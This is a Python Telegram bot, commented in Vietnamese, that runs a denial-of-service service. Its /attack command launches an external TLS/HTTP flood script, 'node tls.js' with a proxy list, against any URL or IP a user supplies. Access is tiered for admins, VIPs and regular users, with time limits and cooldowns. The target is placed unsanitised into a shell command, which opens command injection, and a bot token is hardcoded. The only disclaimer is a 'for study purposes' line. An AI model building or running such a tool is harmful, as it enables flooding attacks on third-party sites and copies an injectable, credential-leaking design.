import asyncio
import subprocess
import shlex
import time
import signal
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Thay thế bằng token bot của bạn
BOT_TOKEN = "8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A"

# Cấu hình admin và VIP
ADMIN_IDS = {7105201572}  # Thay bằng ID Telegram của admin thực tế
VIP_IDS = {555555555, 666666666}    # Thay bằng ID Telegram của VIP thực tế

# Dictionary để lưu thời gian sử dụng lệnh của user thường (cho cooldown)
user_cooldown = {}
USER_COOLDOWN = 120  # 120 giây cooldown cho user thường
MAX_USER_TIME = 120  # 120 giây tối đa cho user thường

# Dictionary để lưu các process đang chạy
active_processes = {}

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    welcome_text = f"""
🤖 Bot Attack TLS đã khởi động!

👤 Loại tài khoản: {user_type}
💡 Các lệnh có sẵn:
/attack <target> <time> - Gửi request tấn công
/stop - Dừng tất cả cuộc tấn công
/myinfo - Thông tin tài khoản
/help - Hiển thị hướng dẫn

📋 Quy định:
{get_usage_rules(user_type)}
    """
    await update.message.reply_text(welcome_text)

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    # Kiểm tra tham số
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ Sai cú pháp!\n"
            "✅ Sử dụng: /attack <target> <time>\n"
            "📝 Ví dụ: /attack example.com 60"
        )
        return

    target = context.args[0]
    attack_time = int(context.args[1])
    
    # Kiểm tra quyền và giới hạn
    check_result = check_attack_permission(user_id, user_type, attack_time)
    if not check_result["allowed"]:
        await update.message.reply_text(check_result["message"])
        return
    
    try:
        # Thông báo đang xử lý
        processing_msg = await update.message.reply_text(
            f"🎯 Đang tấn công {target} trong {attack_time}s...\n"
            f"👤 User: {user_type}\n"
            f"⏰ Thời gian: {attack_time}s\n"
            f"🆔 ID: {user_id}"
        )
        
        # Xây dựng lệnh
        command = f"node tls.js GET {target} {attack_time} 4 5 y.txt --http 2 --debug --winter --full"
        
        # Cập nhật thời gian sử dụng lệnh cho user thường
        if user_type == "User Thường":
            user_cooldown[user_id] = time.time()
        
        # Chạy lệnh với timeout (bất đồng bộ)
        timeout_duration = attack_time + 30
        
        # Tạo process và lưu vào dictionary
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Lưu process vào dictionary
        active_processes[user_id] = {
            'process': process,
            'target': target,
            'start_time': time.time()
        }
        
        # Chờ process hoàn thành hoặc timeout
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout_duration)
            
            # Xóa process khỏi dictionary khi hoàn thành
            if user_id in active_processes:
                del active_processes[user_id]
            
            # Xử lý kết quả
            if process.returncode == 0:
                success_msg = (
                    f"✅ Tấn công hoàn thành!\n"
                    f"🎯 Target: {target}\n"
                    f"⏰ Thời gian: {attack_time}s\n"
                    f"👤 User Type: {user_type}"
                )
                
                output = stdout.decode().strip()
                if output:
                    short_output = output[:500] + ("..." if len(output) > 500 else "")
                    success_msg += f"\n📊 Output:\n`{short_output}`"
                
                await processing_msg.edit_text(success_msg, parse_mode='Markdown')
            else:
                error_msg = stderr.decode().strip() or "Lỗi không xác định"
                await processing_msg.edit_text(f"❌ Lỗi khi chạy lệnh:\n`{error_msg}`", parse_mode='Markdown')
                
        except asyncio.TimeoutError:
            # Timeout - tự động dừng process
            if user_id in active_processes:
                del active_processes[user_id]
            await processing_msg.edit_text(f"⏰ Timeout: Lệnh chạy quá {timeout_duration} giây")
            
    except Exception as e:
        # Đảm bảo xóa process nếu có lỗi
        if user_id in active_processes:
            del active_processes[user_id]
        await update.message.reply_text(f"❌ Lỗi không xác định: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    # Kiểm tra nếu user có process đang chạy
    if user_id not in active_processes:
        await update.message.reply_text("❌ Bạn không có cuộc tấn công nào đang chạy.")
        return
    
    try:
        process_info = active_processes[user_id]
        process = process_info['process']
        target = process_info['target']
        
        # Dừng process
        process.terminate()
        
        # Chờ process dừng hoàn toàn
        try:
            await asyncio.wait_for(process.wait(), timeout=5)
        except asyncio.TimeoutError:
            process.kill()  # Force kill nếu không dừng sau 5 giây
        
        # Xóa khỏi dictionary
        del active_processes[user_id]
        
        stop_msg = (
            f"🛑 Đã dừng tấn công!\n"
            f"🎯 Target: {target}\n"
            f"👤 User: {user_type}\n"
            f"🆔 ID: {user_id}"
        )
        await update.message.reply_text(stop_msg)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi khi dừng tấn công: {str(e)}")

async def stop_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh dừng tất cả tấn công (chỉ admin)"""
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    if user_type != "Admin":
        await update.message.reply_text("❌ Chỉ Admin mới có quyền dừng tất cả tấn công!")
        return
    
    if not active_processes:
        await update.message.reply_text("❌ Không có cuộc tấn công nào đang chạy.")
        return
    
    stopped_count = 0
    for uid, process_info in list(active_processes.items()):
        try:
            process = process_info['process']
            process.terminate()
            try:
                await asyncio.wait_for(process.wait(), timeout=5)
            except asyncio.TimeoutError:
                process.kill()
            del active_processes[uid]
            stopped_count += 1
        except:
            continue
    
    await update.message.reply_text(f"🛑 Đã dừng tất cả {stopped_count} cuộc tấn công!")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lệnh xem trạng thái các cuộc tấn công đang chạy"""
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    if not active_processes:
        await update.message.reply_text("📊 Không có cuộc tấn công nào đang chạy.")
        return
    
    status_text = "📊 **Trạng thái tấn công:**\n\n"
    
    for uid, info in active_processes.items():
        target = info['target']
        start_time = info['start_time']
        elapsed = int(time.time() - start_time)
        
        status_text += f"🎯 **Target:** {target}\n"
        status_text += f"👤 **User ID:** {uid}\n"
        status_text += f"⏰ **Thời gian chạy:** {elapsed}s\n"
        status_text += "━━━━━━━━━━━━━━━━\n"
    
    # Chỉ admin mới xem được tất cả, user thường chỉ xem của mình
    if user_type != "Admin":
        status_text = "📊 **Trạng thái tấn công của bạn:**\n\n"
        if user_id in active_processes:
            info = active_processes[user_id]
            target = info['target']
            start_time = info['start_time']
            elapsed = int(time.time() - start_time)
            
            status_text += f"🎯 **Target:** {target}\n"
            status_text += f"⏰ **Thời gian chạy:** {elapsed}s\n"
        else:
            status_text += "❌ Bạn không có cuộc tấn công nào đang chạy."
    
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    info_text = f"""
📊 Thông tin tài khoản:

🆔 User ID: `{user_id}`
👤 Loại tài khoản: {user_type}
📋 Quyền hạn: {get_permissions_text(user_type)}
🎯 Đang chạy: {'CÓ' if user_id in active_processes else 'KHÔNG'}
    """
    
    # Thêm thông tin cooldown cho user thường
    if user_type == "User Thường":
        remaining_cooldown = get_remaining_cooldown(user_id)
        if remaining_cooldown > 0:
            info_text += f"\n⏰ Cooldown còn lại: {remaining_cooldown} giây"
        else:
            info_text += f"\n✅ Có thể sử dụng lệnh ngay"
    
    await update.message.reply_text(info_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📖 **Hướng dẫn sử dụng:**

⚡ **Lệnh tấn công:**
/attack <target> <time>
• target: URL hoặc IP mục tiêu
• time: Thời gian tấn công (giây)

🛑 **Lệnh dừng:**
/stop - Dừng cuộc tấn công của bạn
/stopall - Dừng tất cả tấn công (chỉ Admin)

📊 **Lệnh trạng thái:**
/status - Xem trạng thái tấn công
/myinfo - Thông tin tài khoản

📋 **Quy định sử dụng:**
• Admin: Không giới hạn
• VIP: Không giới hạn  
• User thường: Tối đa 120s, cooldown 120s

⚠️ **Lưu ý:** Chỉ sử dụng cho mục đích học tập!
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

def get_user_type(user_id):
    """Xác định loại user"""
    if user_id in ADMIN_IDS:
        return "Admin"
    elif user_id in VIP_IDS:
        return "VIP"
    else:
        return "User Thường"

def get_usage_rules(user_type):
    """Lấy thông tin quy định sử dụng theo loại user"""
    if user_type == "Admin":
        return "• Thời gian: KHÔNG GIỚI HẠN\n• Cooldown: KHÔNG CÓ\n• Quyền: Dừng tất cả tấn công"
    elif user_type == "VIP":
        return "• Thời gian: KHÔNG GIỚI HẠN\n• Cooldown: KHÔNG CÓ"
    else:
        return f"• Thời gian: Tối đa {MAX_USER_TIME}s\n• Cooldown: {USER_COOLDOWN}s"

def get_permissions_text(user_type):
    """Lấy mô tả quyền hạn"""
    if user_type == "Admin":
        return "Toàn quyền (Unlimited + Stop All)"
    elif user_type == "VIP":
        return "VIP (Unlimited)"
    else:
        return f"Standard (Max {MAX_USER_TIME}s, CD {USER_COOLDOWN}s)"

def check_attack_permission(user_id, user_type, attack_time):
    """Kiểm tra quyền sử dụng lệnh attack"""
    
    # Kiểm tra user thường vượt quá thời gian cho phép
    if user_type == "User Thường" and attack_time > MAX_USER_TIME:
        return {
            "allowed": False,
            "message": f"❌ User thường chỉ được tối đa {MAX_USER_TIME} giây!"
        }
    
    # Kiểm tra cooldown cho user thường
    if user_type == "User Thường":
        remaining = get_remaining_cooldown(user_id)
        if remaining > 0:
            return {
                "allowed": False,
                "message": f"⏰ Vui lòng chờ {remaining} giây trước khi sử dụng lại lệnh!"
            }
    
    # Kiểm tra nếu user đã có tấn công đang chạy
    if user_id in active_processes:
        return {
            "allowed": False,
            "message": "❌ Bạn đã có một cuộc tấn công đang chạy!\n🛑 Sử dụng /stop để dừng nó trước."
        }
    
    return {"allowed": True, "message": ""}

def get_remaining_cooldown(user_id):
    """Tính thời gian cooldown còn lại"""
    if user_id not in user_cooldown:
        return 0
    
    elapsed = time.time() - user_cooldown[user_id]
    remaining = USER_COOLDOWN - elapsed
    return max(0, int(remaining))

def main():
    # Khởi tạo application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Thêm handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("stopall", stop_all_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Chạy bot
    print("🤖 Bot đang chạy...")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"⭐ VIP IDs: {VIP_IDS}")
    application.run_polling()

if __name__ == "__main__":
    main()
